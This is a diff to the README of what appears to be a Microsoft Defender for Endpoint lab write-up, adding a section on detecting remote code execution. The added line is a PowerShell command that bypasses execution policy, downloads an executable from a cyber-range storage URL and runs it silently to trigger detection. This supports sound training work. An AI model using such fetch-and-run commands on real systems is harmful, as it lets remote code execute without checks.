@@ -35,7 +35,9 @@ Above, you will see that I generated various logs by creating and deleting .txt 
 
 <H2>Remote Code Execution Detection</H2>
 
-<img src= "https://github.com/NickHoward1/Microsoft-Defender-Endpoint---Onboarding-a-VM/blob/986c8fb04f902c70c4dd346913395618662e03b0/Screenshot%202026-05-17%20at%2012.56.41.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src= "https://github.com/NickHoward1/Microsoft-Defender-Endpoint---Onboarding-a-VM/blob/431a12eb10f3f03f3bf1e844364df5b0d5875712/Screenshot%202026-05-17%20at%2013.06.41.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<b>PowerShell Execution code that was run for the lab:</b> `cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"`
+
+<img src= "https://github.com/NickHoward1/Microsoft-Defender-Endpoint---Onboarding-a-VM/blob/431a12eb10f3f03f3bf1e844364df5b0d5875712/Screenshot%202026-05-17%20at%2013.06.41.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src= "https://github.com/NickHoward1/Microsoft-Defender-Endpoint---Onboarding-a-VM/blob/431a12eb10f3f03f3bf1e844364df5b0d5875712/Screenshot%202026-05-17%20at%2013.06.41.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src= "https://github.com/NickHoward1/Microsoft-Defender-Endpoint---Onboarding-a-VM/blob/431a12eb10f3f03f3bf1e844364df5b0d5875712/Screenshot%202026-05-17%20at%2013.06.41.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 
 
 
